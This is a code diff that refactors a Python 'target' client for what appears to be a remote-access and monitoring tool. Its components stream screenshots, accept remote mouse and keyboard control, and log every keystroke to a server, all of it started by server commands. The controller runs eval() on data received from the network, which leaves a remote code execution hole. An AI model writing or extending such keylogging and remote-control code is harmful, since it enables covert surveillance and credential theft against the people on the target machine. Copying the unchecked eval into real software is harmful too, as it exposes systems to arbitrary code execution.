@@ -1,5 +1,5 @@
 from Base.constants import ImageSendModes, DeviceEvents, Reasons, \
-    ClientTypes, ControlDevice
+    ClientTypes, ControlDevice, Actions
 from Base.settings import ACKNOWLEDGEMENT_ITERATION, \
     SERVER_PORT, SERVER_ADDRESS, IMAGE_SEND_MODE
 from Base.socket_base import Socket, Config
@@ -12,11 +12,12 @@ from pynput.keyboard import Controller as KeyController, Key, KeyCode, \
     Listener as KeyboardListener
 from queue import Queue, Empty
 from random import random
+from socket import SHUT_RDWR
 import subprocess
 from threading import Thread
 from time import sleep, time
 import traceback
-from typing import List, Tuple, Union
+from typing import Dict, List, Tuple, Union
 
 
 try:
@@ -33,72 +34,90 @@ except:
     logging.warn("Cannot import gi")
 
 
-class Target(Socket):
+class BaseTarget(Socket):
+    """
+    The base class which all target components inherit.
+    """
+
+    config = Config()
+
+    def __init__(self, *args, **kwargs) -> None:
+        super().__init__(*args, **kwargs)
+
+        self.client_type: bytes
+
+    def reset(self):
+        self.socket.close()
+        self.socket = self.new_socket()
+
+    def start(self):
+        name = self.__class__.__name__
+        logging.info(f"Starting {name}")
+        self.reset()
+        try:
+            self.connect()
+        except (ConnectionRefusedError, TimeoutError):
+            logging.fatal("Cannot connect to server. Aborting")
+            self.stop()
+            return
+
+        try:
+            self.send_data(self.client_type)
+            self.send_data(self.config.code.encode(self.FORMAT))
+            data = self.recv_data()
+        except (BrokenPipeError, ConnectionResetError):
+            logging.fatal("Connection to server closed unexpectedly. Aborting")
+            self.stop()
+            return
+
+        if data == Reasons.ALREADY_CONNECTED:
+            logging.info("Already connected. stoping!")
+            self.stop()
+            return
+        if data == Reasons.MAIN_NOT_CONNECTED:
+            logging.info("Main not connected. stoping!")
+            self.stop()
+            return
+        if data != b"OK":
+            logging.info(f"Unknown error. stoping! Received code {data}")
+            self.stop()
+            return
+
+    def run(self):
+        raise NotImplementedError
+
+    def stop(self, args=None):
+        raise NotImplementedError
+
+
+class Target(BaseTarget):
 
     def __init__(self) -> None:
         super().__init__(SERVER_ADDRESS, SERVER_PORT)
-        self.watched = False    # Set to True if screenshot is to be sent
-        self.controlling = False
 
         self.config = Config()
 
-        self.control_thread = None
+        self.components: Dict[bytes, BaseTarget] = {
+            ClientTypes.TARGET_SCREEN_READER: ScreenReader(),
+            ClientTypes.TARGET_CONTROLLER: Controller(),
+            ClientTypes.TARGET_KEYLOGGER: KeyLogger()
+        }
 
-    def start_screen_reader(self):
-        """
-            starts the screen reader client.
-        """
-        self.screen_reader = ScreenReader()
-        self.controlling = self.screen_reader.init()
-        if not self.controlling:
-            logging.info("Screen reader cannot connect to server. " + 
-            "Either already connected or got disconnected after connection")
+    @property
+    def active_components(self) -> List[BaseTarget]:
+        return filter(lambda component: component.running,
+                      self.components.values())
 
-        i = 0
-        while self.controlling:
-            i+=1
-            self.controlling = self.screen_reader.send_screenshot(i)
-            i %= ACKNOWLEDGEMENT_ITERATION
-        self.screen_reader.stop()
-        self.keylogger.stop()
-        logging.info("Stoping screen reader client")
-
-    def start_controller(self):
+    def start_all(self):
         """
-            Starts the controller.
-            Calls `self.controller.controll` which populates control queues.
-            Starts a new thread which fetches control instructions from queues
-            and executes them.
+            Starts all the target components.
         """
-        self.controller = Controller()
-        self.controlling = self.controller.init()
-        Thread(target=self.controller.run_update_loop).start()
+        for component in self.components.keys():
+            self.start_component(component)
 
-        if not self.controlling:
-            logging.info("Controller cannot connect to server. " + 
-            "Either already connected or got disconnected after connection")
-
-        while self.controlling:
-            try:
-                self.controlling = self.controller.control()
-            except (BrokenPipeError, ConnectionResetError):
-                logging.info("Controller client disconnected")
-                break
-            sleep(0.001)
-            # logging.debug(str(self.controlling))
-        self.controller.stop()
-        logging.info("Stoping controller client")
-
-    def control(self):
-        """
-            Starts controller and screen reader clients.
-        """
-        self.control_thread = Thread(target=self.start_controller)
-        self.control_thread.start()
-        self.keylogger = KeyLogger()
-        self.keylogger_thread = Thread(target=self.keylogger.start)
-        self.keylogger_thread.start()
-        self.start_screen_reader()
+    def start_component(self, component: bytes):
+        if self.components[component] not in self.active_components:
+            Thread(target=self.components[component].start).start()
 
     def run(self):
         """
@@ -107,8 +126,8 @@ class Target(Socket):
             Stops if another client for this target is already connected
 
             TODO: Support selective watching: Do not start all the readers,
-                controllers and listeners at once. Start only the ones requested
-                by the watcher.
+                controllers and listeners at once. Start only the ones
+                requested by the watcher.
         """
         while self.running:
             try:
@@ -131,10 +150,26 @@ class Target(Socket):
                     self.stop()
                     return
                 elif data == b"OK":
-                    logging.info("Starting ScreenReader and Controller")
-                    self.controlling = True
-                    self.control()
-                self.controlling = False
+                    while self.running:
+                        data = self.recv_data()
+                        if data == Actions.WAIT:
+                            pass    # simply wait
+                        elif data == Actions.START_ALL_COMPONENTS:
+                            logging.info("Starting All Components")
+                            self.start_all()
+                        elif data == Actions.START_SCREEN_READER:
+                            self.start_component(ClientTypes.
+                                                 TARGET_SCREEN_READER)
+                        elif data == Actions.START_CONTROLLER:
+                            self.start_component(ClientTypes.
+                                                 TARGET_CONTROLLER)
+                        elif data == Actions.START_KEYLOGGER:
+                            self.start_component(ClientTypes.
+                                                 TARGET_KEYLOGGER)
+                        elif data == Actions.DISCONNECT:
+                            break
+                        else:
+                            raise ValueError(f"Undefined action '{data}'")
                 self.socket.close()
                 logging.info("Disconnected. Stopped sending Target data.")
 
@@ -142,10 +177,12 @@ class Target(Socket):
                 logging.critical("Connection Timed Out")
             except (BrokenPipeError, ConnectionResetError):
                 logging.critical("Disconnected. Trying to reconnect in 2 sec")
+                sleep(2)
             except ConnectionRefusedError:
                 logging.critical("Connection refused")
+                sleep(2)
             except OSError:
-                logging.critical(f"OSError Occured\n"
+                logging.fatal(f"OSError Occured\n"
                     f"{traceback.format_exc()}\n")
             except KeyboardInterrupt:
                 self.stop()
@@ -156,44 +193,60 @@ class Target(Socket):
         """
             The main start function. Use this to start the target client
         """
-        if not self.controlling:
+        if not self.running:
             self.running = True
             self.run()
 
-    def stop(self):
+    def stop(self, args=None):
         """
             Stop this target client and exit
+
+            Note: This function invokes the `stop` function of each component
+                  with the value received from the server as an anrgument.
+                  These arguments are processed by the functions. The function
+                  decides if any children components need to be stopped
         """
         self.running = False
-        self.controlling = False
-        if hasattr(self, "controller"):
-            self.controller.stop()
-        if hasattr(self, "keylogger"):
-            self.keylogger.stop()
+        # if hasattr(self, "controller"):
+        #     self.controller.stop()
+        # if hasattr(self, "keylogger"):
+        #     self.keylogger.stop()
+
+        for component in self.active_components:
+            component.stop(args)            
 
 
-class ScreenReader(Socket):
+class ScreenReader(BaseTarget):
 
     def __init__(self) -> None:
         super().__init__(SERVER_ADDRESS, SERVER_PORT)
+
         self.config = Config()
+        self.reset()
+        self.client_type = ClientTypes.TARGET_SCREEN_READER
+
+    def reset(self):
+        super().reset()
         self.prev_img = None
         self.mss = None
 
-    def init(self) -> bool:
-        """
-            initiate connections and return True if connection 
-            was established else False
-        """
-        self.connect()
-        self.send_data(ClientTypes.TARGET_SCREEN_READER)
-        self.send_data(self.config.code.encode(self.FORMAT))
-        data = self.recv_data()
-        if data == b"OK":
-            return True
-        elif data == Reasons.ALREADY_CONNECTED:
-            return False
-        return False
+    def start(self):
+        super().start()
+
+        self.running = True
+        try:
+            self.run()
+        finally:
+            self.stop()
+            logging.info("Stopped screen reader client")
+
+    def run(self):
+        i = 0
+        self.running = True
+        while self.running:
+            i+=1
+            self.running = self.send_screenshot(i)
+            i %= ACKNOWLEDGEMENT_ITERATION
 
     def send_screenshot(self, i) -> bool:
         """ 
@@ -229,7 +282,8 @@ class ScreenReader(Socket):
                 img_bins = self.get_all_diffs()
         try:
             # t2 = time()
-            if IMAGE_SEND_MODE in (ImageSendModes.DIFF, ImageSendModes.DIRECT_JPG):
+            if IMAGE_SEND_MODE in (ImageSendModes.DIFF,
+                                   ImageSendModes.DIRECT_JPG):
                 self.send_data(img_bin)  # send the image
                 # logging.debug(f"{len(img_bin)/1024}")
 
@@ -240,19 +294,21 @@ class ScreenReader(Socket):
             # to eat less cpu
             if t3-t1 < 0.4:
                 sleep(0.1)
-            # logging.debug(f"{t1_2-t1} {t2-t1_2}, {t3-t2}, {len(img_bin)/1024}, {i}")
-        except (ConnectionResetError, BrokenPipeError):
+            # logging.debug(f"{t1_2-t1} {t2-t1_2}, {t3-t2}, "
+            #               f"{len(img_bin)/1024}, {i}")
+        except (ConnectionResetError, BrokenPipeError, OSError):
             return False
         return True
 
     def get_all_diffs(self, prev_img, img):
         pass
 
-    def stop(self) -> None:
+    def stop(self, args=None) -> None:
         """
             Stop the screen reader. No extra thread was run by this class
             so only closing socket.
         """
+        self.running = False
         self.socket.close()
 
     def take_screenshot(self) -> Image:
@@ -333,47 +389,59 @@ class ScreenReader(Socket):
         return pilImg
 
 
-class Controller(Socket):
+class Controller(BaseTarget):
+    """
+    The class to control keyboard and mouse
+
+    Note: The keyboard and mouse controller can be enabled or disabled
+          separately on watcher side but this single controller
+          controls them both on target side
+    """
 
     def __init__(self) -> None:
         super().__init__(SERVER_ADDRESS, SERVER_PORT)
 
         self.config = Config()
+        self.reset()
+        self.client_type = ClientTypes.TARGET_CONTROLLER
+
+    def reset(self):
+        super().reset()
         self.mouse = Mouse()
         self.keyboard = Keyboard()
 
-    def init(self) -> bool:
+    def start(self):
         """
-            Initiate connection to server. Returns True if 
-            connection is successfull else False.
+            Initiate connection to server.
         """
-        self.connect()
-        self.send_data(ClientTypes.TARGET_CONTROLLER)
-        self.send_data(self.config.code.encode(self.FORMAT))
-        data = self.recv_data()
-        if data == b"OK":
-            self.running = True
-            return True
-        elif data == Reasons.ALREADY_CONNECTED:
-            return False
-        return False
+        super().start()
 
-    def control(self):
-        """
-            Receive control requests and put them in corresponding
-            queues based on `control_type`
-        """
+        Thread(target=self.run_update_loop).start()
+        self.running = True
         try:
-            ctrl_ev = self.recv_data()
-            control_type, *event = eval(ctrl_ev)
-        except (BrokenPipeError, ConnectionResetError, SyntaxError):
-            return False
+            self.run()
+        finally:
+            self.stop()
+            logging.info("Stopped controller client")
 
-        if control_type == ControlDevice.CONTROL_MOUSE:
-            self.mouse.events.put(event)
-        elif control_type == ControlDevice.CONTROL_KEYBOARD:
-            self.keyboard.events.put(event)
-        return True
+    def run(self):
+        while self.running:
+            try:
+                ctrl_ev = self.recv_data()
+                if not ctrl_ev:
+                    break
+                control_type, *event = eval(ctrl_ev)
+
+                if control_type == ControlDevice.CONTROL_MOUSE:
+                    self.mouse.events.put(event)
+                elif control_type == ControlDevice.CONTROL_KEYBOARD:
+                    self.keyboard.events.put(event)
+                else:
+                    raise ValueError(f"Unknown control type '{control_type}'")
+            except (BrokenPipeError, ConnectionResetError, SyntaxError):
+                logging.info("Controller client disconnected")
+                break
+            sleep(0.001)
 
     def run_update_loop(self):
         """
@@ -386,8 +454,9 @@ class Controller(Socket):
             self.keyboard.update()
             sleep(0.001)
 
-    def stop(self):
+    def stop(self, args=None):
         self.running = False
+        self.socket.shutdown(SHUT_RDWR)
 
 
 class Keyboard(object):
@@ -478,7 +547,7 @@ class Mouse(object):
             return [int(i) for i in resolution.split('x')]
 
 
-class KeyLogger(Socket):
+class KeyLogger(BaseTarget):
     """
         send all keys pressed to the server`
     """
@@ -490,6 +559,7 @@ class KeyLogger(Socket):
         self.listener = KeyboardListener(on_press=self.on_key_press,
                                          on_release=self.on_key_release)
         self.vks: Queue[Tuple[int, int]] = Queue()
+        self.client_type = ClientTypes.TARGET_KEYLOGGER
 
     def on_key_press(self, key: Union[Key, KeyCode, None]):
         if isinstance(key, Key):
@@ -501,32 +571,26 @@ class KeyLogger(Socket):
             key = key.value
         self.vks.put((DeviceEvents.KEY_UP, key.vk))
 
+    def reset(self):
+        super().reset()
+        self.listener.stop()
+        self.vks = Queue()
+        self.listener = KeyboardListener(on_press=self.on_key_press,
+                                         on_release=self.on_key_release)
+
     def start(self):
         """
             Start the keylogger. Connect to the server.
         """
-
-        logging.info("Starting keylogger")
-
-        try:
-            self.connect()
-        except (ConnectionRefusedError, TimeoutError):
-            logging.fatal("Cannot connect to server. Aborting")
-            self.stop()
-            return
-
-        try:
-            self.send_data(ClientTypes.TARGET_KEYLOGGER)
-            self.send_data(self.config.code.encode(self.FORMAT))
-            self.recv_data()  # receive b"OK"
-        except (BrokenPipeError, ConnectionResetError):
-            logging.fatal("Connection to server closed unexpectedly. Aborting")
-            self.stop()
-            return
+        super().start()
 
         self.running = True
         self.listener.start()
-        self.run()
+        try:
+            self.run()
+        finally:
+            self.stop()
+            logging.info("Stopped Keylogger")
 
     def run(self):
         """
@@ -535,6 +599,8 @@ class KeyLogger(Socket):
         while self.running:
             try:
                 if self.vks.empty():
+                    self.send_data(Actions.WAIT)
+                    # logging.debug("Waiting")
                     sleep(0.1)
                     continue
 
@@ -542,13 +608,10 @@ class KeyLogger(Socket):
                     lambda x: x.to_bytes(int(log(x, 256)) + 1, "big"),
                     it.chain(*self.get_keys())
                 ))
-                logging.debug(vks)
+                # logging.debug(vks)
                 self.send_data(vks)
             except (ConnectionResetError, BrokenPipeError):
-                logging.info("Stoping Keyboard Controller")
                 break
-
-        self.stop()
 
     def get_keys(self) -> Tuple[Tuple[int, int]]:
         """
@@ -562,7 +625,7 @@ class KeyLogger(Socket):
                 break
         return tuple(keys)
 
-    def stop(self):
+    def stop(self, args=None):
         self.running = False
         self.socket.close()
         self.listener.stop()
